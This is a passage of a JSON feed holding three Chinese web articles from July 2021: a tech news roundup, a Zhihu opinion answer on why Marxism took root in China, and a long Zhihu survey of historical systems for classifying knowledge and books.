[{"title":"派早报：特斯拉换装国产电机、格力将引进鸿蒙、刺客信条新作公布等","date":"2021-07-08 00:37:38","description":"\n<h2>特斯拉 Model 3 及 Model Y 将换装国产电机</h2>\n<p>特斯拉公司近期交付了搭载国产电机的 Model 3 和 Model Y 车型。与此前相比，新车型的电机功率及扭矩有所提升。特斯拉客服表示，换装国产电机后，最大功率和扭矩有细微提升，但驾驶者感受不到实际区别。<a href=\"https://www.pingwest.com/w/245595\" target=\"_blank\">来源</a></p>\n<h2>iPadOS 14 为 Apple Pencil 提供更多语言支持</h2>\n<p>7 月 7 日，Apple 公司更新了网站信息，确认 Apple Pencil 在 iPadOS 上可获得更多语言支持。本次新增的五种语言为德语、法语、西班牙语、意大利语和葡萄牙语，其中包含法语（比利时）、法语（加拿大）、法语（瑞士）、法语（法国）、德语（奥地利）、德语（德国）、德语（瑞士）、意大利语（瑞士）、意大利语（意大利）、葡萄牙语（葡萄牙）、葡萄牙语（巴西）、西班牙语（西班牙）、西班牙语（拉丁美洲）和西班牙语（墨西哥）等。用户使用这些语言手写文字时，系统可以识别其内容，此前仅支持中文和英文。<a href=\"https://www.macrumors.com/2021/07/06/apple-pencil-ipados-14-new-language-support/\" target=\"_blank\">来源</a></p>\n<h2>格力将引进鸿蒙操作系统</h2>\n<p>据韩国 Zdnet 新闻网报道，格力总裁董明珠表示：「今后将引进鸿蒙操作系统。」报道认为，格力是中国空调市场占有率最大的企业，且拥有智能手机业务，所以很可能会将鸿蒙系统置入手机。<a href=\"http://www.cankaoxiaoxi.com/digital/2021/0707/2445781.shtml\" target=\"_blank\">来源</a></p>\n<h2>索尼公司推出颈挂式扬声器 SRS-NB10</h2>\n<p>近日，索尼公司推出颈挂式扬声器 SRS-NB10。SRS-NB10 支持多设备连接，续航时间可达 10 小时，能够确保发出的声音只被佩戴者听到。SRS-NB10 将于今年 9 月在海外上市，定价 150 美元。<a href=\"https://cn.engadget.com/sony-srs-nb-10-neckband-speaker-040011104.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/08/article/949d3fbf512a169dd69d9378b329a615\"><figcaption>图片来自新闻源</figcaption></figure><h2>腾讯会议推出天籁语音模组</h2>\n<p>针对复杂声学场景下的实时语音，腾讯会议旗下的天籁实验室于 7 月 7 日正式推出天籁语音模组方案，该方案可以实现 12 米的精准长距离拾音，并且可以实现在多人语音时每人都可以听清，并可以对现场多种类型的噪音进行针对性消除，该方案将应用在腾讯会议 Rooms 专款机型上，后续将开放相关的音视频认证标准。<a href=\"https://www.tmtpost.com/nictation/5459532.html\" target=\"_blank\">来源</a></p>\n<h2>深圳出台国内首部综合性数据法规</h2>\n<p>7 月 6 日，深圳市人大常委会通过官网公布《深圳经济特区数据条例》（以下简称《条例》）。《条例》将于 2022 年 1 月 1 日正式生效，是国内数据领域的首部基础性、综合性立法。《条例》中明确对「人脸识别」、「指纹验证」、「声音解锁」、「虹膜识别」等生物识别数据的获取和滥用进行了限制，禁止「App 不全面授权就不让用」等限制性行为。<a href=\"https://www.donews.com/news/detail/1/3160361.html\" target=\"_blank\">来源</a></p>\n<h2>育碧公布下一代《刺客信条》项目</h2>\n<p>游戏开发商育碧公司通过第一方博客公布了下一代动作游戏《刺客信条》项目，该作的项目代号为「无限」（Infinity），将由育碧魁北克和蒙特利尔工作室联合开发。育碧表示，项目尚处早期阶段，游戏可能会横跨多个历史时期，预计将于 2024 年发布。<a href=\"https://news.ubisoft.com/en-us/article/GZi5hT4dBeM8YITOsJeCn/an-update-on-assassins-creed-infinity-and-the-future-of-the-assassins-creed-franchise\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/500a7080228cf921f23a681662153889\"><figcaption>图片来自新闻源</figcaption></figure><h2>杨紫琼将加盟《猎魔人》前传剧集</h2>\n<p>流媒体平台 Netflix 确认，华裔女演员杨紫琼将加盟《猎魔人》前传作品《猎魔人：血源》，出演剑精灵 Scían，该角色是游牧部族的最后一位幸存者。《猎魔人》前传将由原《猎魔人》剧组打造，故事设定于正传的 1200 年前，聚焦首位猎魔人的诞生。<a href=\"https://www.gcores.com/articles/138981\" target=\"_blank\">来源</a></p>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li>💉 <a href=\"https://sspai.com/post/66902\" target=\"_blank\">关于新冠疫苗，你想知道的问题都在这里了</a>\n</li>\n<li>✒️ <a href=\"https://sspai.com/post/67584\" target=\"_blank\">不买可以先收藏 07：从自用到送礼，帮你选支好钢笔</a>\n</li>\n<li>💻 <a href=\"https://sspai.com/post/67541\" target=\"_blank\">新手如果没有搭建环境，还能怎样快速练习写代码？</a>\n</li>\n<li>🚗 <a href=\"https://sspai.com/post/67554\" target=\"_blank\">触摸蓝天、拥抱大地——青甘大环线记录</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67603"},{"title":"为什么马哲没有被西方国家（它的发源地）广泛接受，却在中国、俄国、拉美地区生根发芽？","date":"2021-07-07 23:06:42","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-f04d65ed0008119f42f578e3957a23a2_l.jpg?source=8673f162\"><span>墨子连山，</span><span>干货在这不受待见，我把他们放在“同名公众号”了……</span>\n<a href=\"https://www.zhihu.com/question/452023901/answer/1982443264\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>因为西方掉进了资本主义这个局部最优陷阱。</strong></p>\n<p>之前回答过一个类似的问题，为什么中国五千年文明，却没有发展出体系化的现代科学？</p>\n<p>答案同样是因为中国掉进了局部最优陷阱。</p>\n<p>欧洲为什么发展出了科学？因为他们一直在低位徘徊，文艺复兴开始触底反弹了。</p>\n<p>秦始皇统一中国，车同轨，书同文，建立了中央集权的统一帝国。在当时的生产力水平下，中央集权的大帝国可以统一调配资源，这些高度集中的资源被用在兴修水利、基础建设、国防安全等方面，其对生产力的促进是那些分散的小国无可企及的。</p>\n<p>从此之后，吃到中央集权甜头的中国人便始终追求着大一统。</p>\n<p>秦朝二世而亡，取而代之的汉朝仍然维持了大一统，经过几代人的摸索，终于由汉武帝找到中央集权的思想理论指导，即外儒内法。</p>\n<p>这种思想在今后的两千年中经受了岁月的考验，自始至终发挥着无与伦比的效用，足见其强大之处。</p>\n<p>隋唐发明的科举制度，可谓中国最伟大的发明，这种制度将外儒内法的思想发挥到了极致，在之后一千多年中的绝大部分时间里，中国始终保持着稳定的统一。</p>\n<p>正是这样的稳定统一，使得中国在两千年时间里屹立于世界之巅。</p>\n<p>然而，也正是由于这种优势，使得中国人的认知出现了局限，大家开始“一心只读圣贤书”，专注于道德修养，关注于人与人的关系。因为历史一再证明，只要能够把人的问题解决好，就可以维持相当优越的生活。于是，中国人开始忽视客观世界，甚至对物质产生了鄙视，更不要说去钻研客观事物了。</p>\n<p>一个典型的例子就是“格物”。既然叫“格物”，而没有叫“格人”，其最初的含义显然包含了客观事物。但是在后来的发展过程中，格的对象逐渐发生了偏移，最终焦点完全转移到了“欲情念”等主观方面。而这种关注自身的倾向并没有阻碍生产力发展，相反的，他造就了一批批的君子，在这些君子的领导之下，这个大一统的帝国得已稳定运行，客观上促进了生产力的发展。</p>\n<p>中国就此掉入局部最优陷阱。</p>\n<p>如果现在回头看，我们很容易发现这种陷阱，因为王朝持续的时间总是不能长久，经历了数个朝代之后，这种只关注人的倾向就很值得质疑了吧？如果我们只需要道德高尚的人，那么为什么那么多朝代都会灭亡呢？难道朝代延续会导致道德沦丧？这无论如何也讲不通吧？</p>\n<p>既然是认知问题，当局者迷，古人最终也没能跳出这个陷阱。他们总是从人的方面去总结前代的经验教训，殊不知，这里面最主要的原因并不是人，而是生产力发展无法满足人口增长。说白了，就是安居乐业时间长了，人口多了，但是粮食增长不够快，于是容错率越来越低，有点什么灾害就要饿肚子，人吃人。这也就是为什么朝代末年农民起义的根本原因，就是吃不上饭嘛！</p>\n<p>不过，以当时的数据统计能力，这个陷阱确实隐藏的太深了，也不能苛责古人。</p>\n<p>反观欧洲，为什么他们可以发展出科学？</p>\n<p>因为欧洲漫长中世纪，在宗教的统治下始终处于四分五裂的状态，使得资源无法集中调配，因此生产力始终发展缓慢。直到 14 世纪，意大利出现了资本主义萌芽，这是生产力发展的必然结果，中国早在宋代也已经出现了。</p>\n<p>区别是什么？</p>\n<p>中国的中央集权之强大，直接扼杀了资本主义萌芽，新兴的资产阶级根本没有能力挑战官僚集团，更不用说皇权了。</p>\n<p>而欧洲不同，他们的领主相对弱小，意大利当时只是一个个的小城帮，新型的资产阶级是有能力与他们进行较量的。于是，在生产关系适应生产力的大趋势下，资产阶级开启了文艺复兴运动。</p>\n<p>什么叫文艺复兴？</p>\n<p>说的好听，其实就是西方版的拿来主义。基督教体系已经摇摇欲坠，又没有新的体系可以替代，怎么办？于是意大利人开始病急乱投医，把被遗忘了一千多年的古希腊文明拿过来用，美其名曰“复兴”。</p>\n<p>他们对古希腊文明进行了升级改造，使之适应了资本主义生产关系，然后大言不惭的说自己是希腊文明的继承者。就文明的载体而言，他们使用着不同的文字和语言，很难说这是一种“继承”，其实更像是购买了一个老字号，打上了人家的牌子而已。</p>\n<p>不过，不论如何，这条路是走对了，然后就有了哥白尼、伽利略……</p>\n<p>另一方面，由于低下的生产力难以养活增长的人口，于是逼出了大航海时代，然后就是地理大发现。新的粮食作物、经济作物以及白银的发现直接助推资本主义发展进程。</p>\n<p>有钱了，自然就会有一批“闲人”，可以去研究一些与生产没有直接关系的学问，于是科学得到了大发展。</p>\n<p>既然欧洲人已经开启了科学之门，中国自然没有必要重复发明轮子，就好像中国发明造纸术、印刷术，欧洲也不会发明出另外一种形式的“书”。</p>\n<p>资本主义的血腥扩张导致了欧洲对中国的侵略和殖民，这使得中国曾经大大落后于欧洲。</p>\n<p>现在把中国与西方掉个个儿，是不是正好能够回答这个问题？</p>\n<p>正是因为西方资本主义的高度发展，使得他们对资本产生了生理依赖，根本摆脱不掉；反观中国，我们已经拆除了地面上的一切违建，万丈高楼平地起。这就是盘旋上升，这就是祸兮福所依，福兮祸所伏。</p>\n<p>而我们的根基正是两千多年的大一统，与生俱来带着“天下为公”、“大同世界”的理想，马克思指给我们路径，但道路千万条，为什么我们会选择这条路？因为我们数千年来本就朝着那个方向奋斗着。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/452023901\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737854"},{"title":"如何对知识分类？","date":"2021-07-07 23:06:35","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-1b2889cd21a77789194e961efc7f6f09_l.jpg?source=8673f162\"><span>ag獭，</span><span>好奇而无用的獭獭</span>\n<a href=\"https://www.zhihu.com/question/20716696/answer/1916421893\" hidden>阅读原文</a>\n</div>\n<div>\n<p>想做一个按照知识树和标签对内容进行分类，以便采集信息、整理资源、进行讨论的网络平台。之前为了对网络和文献中的信息进行分类，根据中国大百科全书和中图分类法制作了一张分类图——</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3aa12fd8e16a7cdce35197b517e3a901_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当然，上图的知识树主要是根据现代的学科设置进行分类的，近期在查找资料，整理古代世界科学发展的过程中，能够很真切地了解到，古人对世界的认识、对学科和事物的分类，与今天人们的观念是非常不同的。</p>\n<p><strong>古代的知识分类</strong></p>\n<p><a href=\"https://www.zhihu.com/question/20454603/answer/719776178\">历史上有哪些全才全能型的人物？</a></p>\n<p>我们今天说到毕达哥拉斯，会说他是古希腊数学家、哲学家，而在毕达哥拉斯眼中“数即万物”，他的数学观念，其实是和他的哲学观、宗教观一脉相承的，彼此并无明确的界限。今天说到葛洪，我们会说他是魏晋时代的道教学者、炼丹家、医学家，而在葛洪的时代，炼丹和医学，其实也是和他的道教实践融为一体的。可见在古人眼中，学科的界限，往往并没有当下那么明晰，今天所说的物理、化学、哲学，在古人眼中，也许属于同一类认识世界，解释世界的方法，在文艺复兴时的欧洲，大概可以笼统的被归入自然哲学的范畴。</p>\n<p>科学科学，字面上理解，可以看做是分科的学术，细致明确的知识和学科分类，可说是近现代学术的主要特征之一。如何对知识进行分类，体现着对世界的看法，那么在古人眼中，知识和学科的分类又是如何的呢？</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b969580c405d54e8ef96877523d707c3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《尔雅》</figcaption></figure><p>为了更好地认识万物，很久以前，先民就开始对事物进行分类。最初的分类，主要是关于平日接触的动植物、矿物等。成书于战国至两汉时代的词典《尔雅》，将动物分为鸟兽鱼虫四大类，这大概是我国最早的动物分类。大约同时代，古希腊哲学家亚里士多德根据动物的性状，将其分为冷血动物、温血动物等类别，并按照其构造完善程度依次排列，形成高低有序的阶梯。</p>\n<p>随着书面著作的增加，以及教育的体系化，为了便于检索收藏，东西方古文明先后发展出了不同的图书编目和学科划分体系，和上面所说的生物分类比较，图书编目和学科划分更关注知识和内容本身，大致就相当于古人的知识分类体系。</p>\n<p><strong>古代中国的知识分类</strong><strong><strong>刘歆与六略</strong></strong></p>\n<p>河平三年（公元前 26 年），光禄大夫刘向受命整理校对宫廷藏书，并为每本书撰写简明提要，汇编为《别录》，刘向将《别录》中的 603 种图书分为 6 大类，38 小类。刘向死后，其子刘歆以《别录》为基础，删去内容提要，编为《七略》，其中的《辑略》，是关于古代学术发展的简史，因此本书虽然名为《七略》，其实还是将宫廷藏书分为 6 类，分别为——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c38b66ee3ba96a9938e6666ff57fee43_720w.jpg?source=8673f162\" alt=\"\"></figure><p>可见，今天我们所说的古代科技著作，在两千多年前的中国，大多被归为术数与方技（合称方术）之类，与占卜、风水、修仙等并列，和今天的认知观念显然大为不同。</p>\n<p>东汉班固在编写《汉书》时，以刘歆的《七略》为基础，保留其图书分类，删去提要部分，增补了其后的一些学者著作，将其改编为《汉书·艺文志》。此后，历代的官修史书大多都仿制其体例，编有图书目录性质的艺文志或经籍志。</p>\n<p><strong><strong>经史子集</strong></strong></p>\n<p>七略之后，先后有学者编写了《七志》《七录》等图书目录，但最终在中国产生巨大影响的，则是经史子集的四部分类法。四部分类法可以追溯至西晋开国功臣荀勖编写的《晋中经簿》，他将六略改编为甲（经）乙（子）丙（史）丁（诗赋）四部。东晋的李充进一步完善了四部分类，最后在唐代名臣魏征编写的《隋书·经籍志》，经史子集的四部分类最终确立，几乎成为中国古代的官方图书分类标准，其后千年虽有调整，大体结构却保持不变。</p>\n<p>《隋书·经籍志》收录四部经传 3127 部，36708 卷，注释中附有梁至隋代遗失图书 1064 部，12759 卷，共计 4191 部，49467 卷，分经史子集 4 大类，40 小类，以及编外的佛录、道录，具体为——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2ba82c2c837c5de45ad2af4760c77de8_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>完善版的经史子集：《四库全书总目》</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b56b4e7a8b385e756633898c0735ff98_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《四库全书》</figcaption></figure><p>清代的《四库全书》，是中国古代规模最大的丛书，其中的目录和提要部分，即《四库全书总目》按照经史子集的四部分类，将 10254 种图书分为 4 部 44 类，一些类进一步分为若干小类，代表着经史子集四部分类法在千年之后的演化形式，具体为——</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b0cea8f8482565e989edcf4323b9ebcd_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>百科类书</strong></strong></p>\n<p>类书是中国古代的大型工具书，它的定位类似今天的百科全书和索引图书，往往辑录了许多书中的材料，并按照一定的门类进行分类。著名的类书有三国时的《皇览》，唐代的《艺文类聚》，宋代的《太平御览》《太平广记》《册府元龟》，明代的《永乐大典》，清代的《古今图书集成》等。</p>\n<p>类书的分类方式并不固定，有以经史子集四部进行归类的，也有自创分类的，这里不一一列举，有兴趣的可以自己查询相关类书的介绍，感受下它们的分类规则。</p>\n<p><strong>陈梦雷的《古今图书集成》</strong></p>\n<p>清代学者陈梦雷编纂的《古今图书集成》是中国古代规模最大、资料最丰富的类书。《古今图书集成》全书共 1 万卷，约 1.6 亿字，仅目录就有 40 卷，收录了天文地理历史人文音韵艺术等各方面的内容，保留了大量古籍中的文字内容。全书分为 6 编，32 典，6109 部，图示如下——</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-9b752f091ffa93763d1f7ff51c11037b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>梁启超的《</strong>西学书目表<strong>》</strong></strong></p>\n<p>清代末年，面临千年未有变局，各界人士救亡图存，将西方图书引入中国。为了对翻译来的西方图书进行宣传整理，著名学者梁启超编写了《西学书目表》，将图书分为西学、西政、杂类三大类，打破了传统的经史子集四部分类，对近代西方图书分类法的输入产生了一定影响，具体为——</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-71384bf575627349778cf72103c64916_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>古代西方的知识分类</strong></p>\n<p>古代西方的知识分类，与图书馆的发展密不可分。最早的图书分类也许来自两河流域，亚述王朝末代君主亚述巴尼拔曾在尼尼微建立图书馆，收集了 2.5 万多块泥版文献，每块泥版上都有标记，表明其收藏地点。为了便于检索，又制作了一些泥版图书目录。随着亚述王朝覆灭，亚述巴尼拔图书馆的大量泥版被埋藏在废墟中，不为人知，直到 1845-1854 年期间被考古学家重新发掘。</p>\n<p><strong>亚里士多德的学科观</strong></p>\n<p>在亚里士多德之前，古希腊学术已经有了相当的发展，不同领域已经出现了问题分类的雏形，但真正的学科分类则是从亚里士多德开始的。亚里士多德认为：“所有思想要么是实践性的，要么是生产性的，要么是理论性的。”把知识划分为生产（诗歌）、理论和实践三部分，如图所示——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ebd8e33a0761b32092a261b4cb56ccdb_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>卡利马科斯的《书表》</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fe72087bebd5bf9f04b48628aed61d9d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>亚历山大里亚图书馆</figcaption></figure><p>传说亚历山大里亚图书馆的卡利马科斯（Callimachus，公元前 310- 前 240）编写了西方世界的第一份书目 Pinakes（意为书表）。全书长达 120 卷，但如今仅存残片，无法了解其全貌。关于卡利马科斯的图书分类，有 6 大类、8 大类、12 大类之说，一般认为包括——修辞、法律、史诗、悲剧、喜剧、抒情诗、历史、医学、数学、自然科学和其他几大类。每一类均按照作者字母或年代排序，附有生平和图书信息的简介。</p>\n<p><strong>古典七艺</strong></p>\n<p><a href=\"https://www.zhihu.com/question/39028993/answer/645270344\">真正的精英教育是怎样的？</a></p>\n<p>教育，是知识分类体系的另一源流。柏拉图之后，古希腊逐渐形成了以语法、逻辑和修辞为基础，注重演讲和思辨的教育特色。这一传统随后被罗马继承和发展。形成了以语法、逻辑和修辞为基础学科（Trivium），天文、几何、算术和音乐为进阶学科（Quadrivium）的教育传统。</p>\n<p>西罗马灭亡之后，教会成为古典文明的避难所。修道士卡西奥多鲁斯（Cassiodorus，490-583）在意大利南部建立维瓦留姆修道院，以个人藏书为基础建立了图书馆。他致力于发展教育，强调要研究非宗教书籍，以加深对《圣经》的理解。为此，卡西奥多鲁斯收集了大量世俗藏书，在修道院内设置了抄书室，并配有装订工人。在卡西奥多鲁斯和同时代的西班牙神学家波伊提乌（Boëthius）、圣伊西多（Isidore）等人的总结发展下，古典时代的教育被定型为包括前三艺（Trivium）和后四艺（Quadrivium）在内的“七艺”教育，成为西方中世纪教育的规范。</p>\n<p><strong>格斯纳的《世界书目》</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-08665c2589420ee7e10b9eedaf12588a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《世界书目》</figcaption></figure><p>文艺复兴时期的瑞士博学家康拉德·格斯纳（Conrad Gesner）编写的《世界书目》（Bibliotheca universalis），是印刷术发明后，欧洲的第一部综合性书目。《世界书目》收录了约 3000 位作家的 12000 多本图书，将其按字母排序，并添加双向索引以便检索，他的工作被认为是培根等百科全书式学者的先驱。格斯纳后来准备出版一本 21 卷的分学科增订版书目，其中的药物卷从未被出版过，已出版和计划中的分卷包括：语文学、辩证法、修辞、诗歌、算术、数学、音乐、天文、占星、神秘学、地理、历史、机械、自然哲学、形而上学、道德哲学、经济学、政治学、法学、基督教哲学和药学。</p>\n<p><strong>法国人的贡献</strong></p>\n<p>法国图书馆学者 Gabriel Naudé（1600-1653）曾为当时执掌法国大权的枢机主教马扎然管理图书馆。图书馆的藏书一度达到 4 万卷，是法国第一个面向公众开放的图书馆。为了有条理的组织藏书，Naudé建立了一个 7 大类的分类系统，包括：神学、医学、法学、历史、哲学、数学和人文学科，和之前的分类法相比，Naudé的分类已经和今日的学科分类比较接近。后来，他又将大类扩充至 12 种。</p>\n<p><strong>狄德罗和达朗贝尔之树</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/7ca371e3ca5ddc6ad9a4e389e39af566_720w.jpg?source=8673f162\" alt=\"\"><figcaption>具象人类知识系统，有时也被称为狄德罗和达朗贝尔之树</figcaption></figure><p>18 世纪，法国掀起了声势浩大的启蒙运动，这是堪与文艺复兴媲美的人类思想史上的大事。1751-1772 年间，在书商布雷顿策划下，以哲学家狄德罗为主编，数学家达朗贝尔为副主编，孟德斯鸠、魁奈、杜尔哥、伏尔泰、卢梭、布丰等约 150 位学者，参与编写了著名的《百科全书，或科学、艺术和工艺详解词典》（Encyclopédie, ou dictionnaire raisonné des sciences, des arts et des métiers，一般称为百科全书）。这被认为是史上第一部总括科学、艺术的综合性百科全书。</p>\n<p>从工具书角度而言，狄德罗和达朗贝尔的百科全书并非完美，书中词条质量不一，一些词条夹叙夹议，不够客观。使其流芳百世的是其思想价值，用狄德罗的话说，就是以此“改变人们的思维方式。”为此，狄德罗和达朗贝尔为百科全书编制了一份全面的知识图谱，名为具象人类知识系统（Système figuré des connaissances humaines），将人类知识分为记忆 / 历史、理智 / 哲学、想象 / 诗歌三大领域（这种划分可以追溯至英国思想家弗朗西斯培根），整理成汉化版如下——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c9d0942e5b1ccc849a6124d91bcac146_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>近现代图书分类法</strong></p>\n<p>1842 年由 Jacques Charles Brunet 创立的巴黎书商分类法，被认为是第一种现代图书分类法。巴黎书商分类法将图书分为神学、法学、科学与艺术、历史、美文学五大类。今天，常用的图书分类法还包括杜威十进制图书分类法、通用十进制图书分类法、美国国会图书馆图书分类法等。偷懒一下，就直接摘录维基上的介绍了。</p>\n<p>杜威十进制图书分类法（Dewey Decimal Classification）</p>\n<blockquote>1876 年由美国图书馆专家麦尔威·杜威撰写并出版。起初该分类法内容仅描述于 4 页折页中，但经历扩充至并进行 23 次主要改版，最近一次修订是在 2011 年完成。该分类法在小型图书馆应用较广。十大分类包括——<br>000 - 总类<br>100 - 哲学与心理学<br>200 - 宗教 <br>300 - 社会科学 <br>400 - 语文 <br>500 - 自然科学 <br>600 - 应用科学 <br>700 - 艺术 <br>800 - 文学 <br>900 - 历史与地理</blockquote>\n<p>通用十进制图书分类法（Universal Decimal Classification）</p>\n<blockquote>19 世纪末，在杜威十进制图书分类法基础上，比利时书目学家 Paul Otlet、Henri la Fontaine 研发了这种分类。此种分类方法由数字和特殊符号组成，在世界各地被广泛使用。分类包括——<br>0 总汇<br>1 哲学，心理学<br>2 宗教，神学<br>3 社会学，政治，经济，法律，教育，人类学<br>4 暂无（由图书馆具体添加）<br>5 自然学科，数学<br>6 实用学科，医学，科技，企业经济学，计算机<br>7 艺术，手工艺品，音乐，竞技，体育<br>8 语言学，文学<br>9 地理，生物，历史</blockquote>\n<p>美国国会图书馆图书分类法（Library of Congress Classification）</p>\n<blockquote>是美国国会图书馆使用的图书分类法，首次采用于约 19 世纪末期至 20 世纪初期。现时为不少欧美大学图书馆所采用，它用了 26 个英文字母其中的 21 个作分类代码。大类分别为——<br>A - 总类<br>B - 哲学、心理学、宗教<br>C - 历史学和相关科学总论<br>D - 世界史（除美国史）<br>E - 美国史<br>F - 前英属、荷属、法属美洲和拉丁美洲地方史<br>G - 地理、人类学、休闲<br>H - 社会科学<br>J - 政治科学<br>K - 法律<br>L - 教育<br>M - 音乐<br>N - 艺术<br>P - 语言与文学<br>Q - 科学<br>R - 医学<br>S - 农业<br>T - 技术<br>U - 军事科学<br>V - 海军科学<br>Z - 目录学, 图书馆科学</blockquote>\n<p><strong>古代伊斯兰世界的知识分类</strong></p>\n<p>卡利马科斯的图书分类法以及亚里士多德的哲学对整个地中海世界都产生了影响，其中也包括中世纪的伊斯兰世界。</p>\n<p><strong>al-Nadim 的 Kitābal-Fihrist</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b4f757d23592b62e1fb55cae1722ee59_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Kitābal-Fihrist</figcaption></figure><p>Ibn al-Nadim（932-995）是巴格达的书商兼传记作者。他受古希腊和罗马启发，编写了一部包括约 2000 位作者，10000 本书的书目 Kitābal-Fihrist，被认为是广义西方的第一部综合性书目。Kitābal-Fihrist 收罗了从印度到罗马的古今书籍（其中的波斯书籍今天几乎都已经遗失），并列出其体裁、章节和概要以便检索，分类大致如图——</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3b1e057975a665be85557cb1045bfe36_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>法拉比的《科学之统计》</strong></p>\n<p>中亚和波斯是伊斯兰世界的主要学术中心，这里的学者也根据自己对世界的认识，将知识分为若干类别。喀喇汗王朝的著名学者法拉比（Al-Farabi，872-950）将哲学视为知识的总和，将其初步划分为理论哲学与实践（市民）哲学，理论哲学大约对应今天的哲学和自然科学，实践哲学则大致对应社会科学。在其著作《科学之统计》中，法拉比提出了如下的学科分类——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-97693c817233683cf114dd65e51fd84d_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>花拉子米的学术分类</strong></p>\n<p>法拉比的分类法被其后的著名思想家伊本西那、纳西尔丁.图西等采纳，虽有改动，但区别不大。另一种学科分类法来自花拉子米（Abu Abdullah al-Khwarizmi，？-997，不是创立代数的那位花拉子米）。花拉子米认为学术不仅是关于事物的知识，也是关于真主和神启的知识，是特殊人群的财富，他的分类大致是——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e998335cead9c4e81b3c839586132d2f_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>设拉子的《王冠之珠》</strong></p>\n<p>最后一种分类法由安萨里（Al-Ghazali，1058-1111）、Fakhr al-Din al-Razi（1150-1210，不是炼金术士拉齐）和库特布丁.设拉子（Qutb al-Din Shirazi，1236-1311）创立。在其著作《王冠之珠》中，设拉子将学术分为哲学和非哲学两大类，认为哲学是不受时间地点影响的永恒真理，非哲学则会随时间、地域、族群而受到影响，可分为宗教和非宗教的，他的分类大致如下——</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d50d86cce814eb1acdeb737385ce7561_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>古代古印度的知识分类</strong></p>\n<p>吠陀时代的印度重视口传而无视文本，即使在塔克西拉那样的学术中心，也没有找到文献和图书馆的痕迹。佛教兴起后，注重以文本辅助教学，记载教义，于是在古印度，也出现了图书馆那样的藏书机构。最有名的古代图书馆位于那烂陀寺，这是印度古代的佛教学术中心，吸引了包括唐僧在内的各方僧众来此学习。但可惜的是，那烂陀寺最终毁于穆斯林的侵略，其中的书籍经卷也荡然无存。（古代波斯和中亚的学术文献大多也毁于战火，其实这些文明并不是没有写过文献，只是未能流传下来）</p>\n<p>和印度庞大的人口比起来，古代印度传世文献的数量，实在少得可怜。一方面，这和印度文化的传统有关，另一方面，印度湿热的气候，以及战火的破坏，也不利于文献的保存。一番查找之后，并没有找到古代印度的学科分类，有了解的朋友，可以补充一下。</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/List_of_historic_Indian_texts\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>en.wikipedia.org/wiki/L</span><span>ist_of_historic_Indian_texts</span><span></span></a></p>\n<p>维基上关于莫卧儿统治之前印度文献的归类，其中的书籍数量尚不及西汉《七略》所载，去除宗教经典，所剩更是不多……</p>\n<p>最后打个广告，如果有了解网站制作，并且对开发回答开头描述的平台有兴趣的朋友，可以联系我呀~</p>\n<p><strong>简化版答案——</strong></p>\n<p><a href=\"https://www.zhihu.com/question/22305797/answer/1934016028\">如何用一张图描述人类的知识图谱？</a></p>\n<p><strong>相关内容——</strong></p>\n<p><a href=\"https://www.zhihu.com/question/24730824/answer/62033344\">有哪些值得你推荐的百科全书?</a><a href=\"https://www.zhihu.com/question/33889180/answer/810113870\">哪些网站帮你打开了新世界的大门？</a><a href=\"https://www.zhihu.com/question/309999864/answer/581075670\">有什么不错的搜索引擎推荐？</a><a href=\"https://zhuanlan.zhihu.com/p/35468607\">ag 獭：【破障行动】免费网络资源推荐名录 1</a></p>\n</div>\n</div>\n<div><a 